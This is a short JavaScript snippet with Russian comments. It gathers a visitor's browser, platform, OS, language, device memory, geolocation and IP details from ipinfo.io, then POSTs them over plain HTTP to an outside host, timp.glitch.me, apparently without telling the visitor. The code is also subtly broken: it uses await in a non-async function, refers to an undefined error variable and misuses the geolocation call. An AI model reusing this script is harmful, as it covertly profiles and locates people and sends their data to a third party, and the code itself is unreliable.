function success(position) {
  const latitude  = position.coords.latitude;
  const longitude = position.coords.longitude;
  // Используйте данные широты и долготы
}

function error() {
  console.warn(`ERROR(${err.code}): ${err.message}`);
  // Вы можете также вывести сообщение в интерфейсе пользователя
  alert("Не удалось получить ваше местоположение. Пожалуйста, убедитесь, что у вас включена геолокация и вы предоставили доступ к ней.");
}

const options = {
  enableHighAccuracy: true,
  timeout: 5000,
  maximumAge: 0
};

function getSystemInfo() {
    const systemInfo = {
        browser: navigator.appName,
        platform: navigator.platform,
        osinfo: navigator.oscpu,
        geo: navigator.geolocation.getCurrentPosition(success, error, options),
        language: navigator.language,
        deviceMemory: navigator.deviceMemory || 'Неизвестно'
    };

    // Получение данных IP-адреса
    const ipInfo = await fetch('https://ipinfo.io', { credentials: 'omit' })
                         .then(res => res.json())
                         .catch(err => console.error('Ошибка при получении IP-адреса:', err));

    if (ipInfo) {
        // Добавление данных IP-адреса к объекту systemInfo
        systemInfo.ip = ipInfo;
    }
    
    return systemInfo;
}

async function uploadSystemInfo() {
    const info = getSystemInfo(); // Получаем информацию о системе
    console.log("Отправляемые данные:", info);
    console.log("JSON:", JSON.stringify(info));
    await fetch('http://timp.glitch.me/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(info) // Отправляем информацию о системе
    });
}

